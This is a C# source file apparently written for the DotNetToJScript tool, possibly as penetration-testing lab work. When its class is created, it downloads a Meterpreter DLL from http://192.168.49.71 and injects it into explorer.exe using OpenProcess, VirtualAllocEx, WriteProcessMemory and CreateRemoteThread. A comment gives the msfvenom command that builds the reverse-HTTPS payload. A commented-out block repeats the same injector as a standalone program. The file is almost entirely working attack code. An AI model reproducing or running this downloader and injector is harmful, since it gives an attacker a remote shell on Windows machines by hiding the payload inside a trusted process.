//    This file is part of DotNetToJScript. //    Copyright (C) James Forshaw 2017 // //    DotNetToJScript is free software: you can redistribute it and/or modify //    it under the terms of the GNU General Public License as published by //    the Free Software Foundation, either version 3 of the License, or //    (at your option) any later version. // //    DotNetToJScript is distributed in the hope that it will be useful, //    but WITHOUT ANY WARRANTY; without even the implied warranty of //    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the //    GNU General Public License for more details. // //    You should have received a copy of the GNU General Public License //    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.  using System;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;  [ComVisible(true)] public class TestClass {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr
    CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);     public TestClass()     {
        //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.71 LPORT=443 -f dll -o met.dll
        String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        String dllName = dir + "\\met.dll";

        WebClient wc = new WebClient();
        wc.DownloadFile("http://192.168.49.71/met.dll", dllName);

        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);
        IntPtr outSize;
        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);     }      public void RunProcess(string path)     {         Process.Start(path);     } }



/*
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Runtime.InteropServices;


namespace dll_injection
{
class Program
{
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
   static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
   static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
   [DllImport("kernel32.dll")]
   static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
   [DllImport("kernel32.dll")]
   static extern IntPtr
   CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
   [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] 
   static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
   [DllImport("kernel32.dll", CharSet = CharSet.Auto)] 
   public static extern IntPtr GetModuleHandle(string lpModuleName);
   static void Main(string[] args)
   {
       //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.71 LPORT=443 -f dll -o met.dll
       String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
       String dllName = dir + "\\met.dll";

       WebClient wc = new WebClient();
       wc.DownloadFile("http://192.168.49.71/met.dll", dllName);

       Process[] expProc = Process.GetProcessesByName("explorer");
       int pid = expProc[0].Id;
       IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
       IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);
       IntPtr outSize; 
       Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
       IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
       IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
   }
}
}
*/
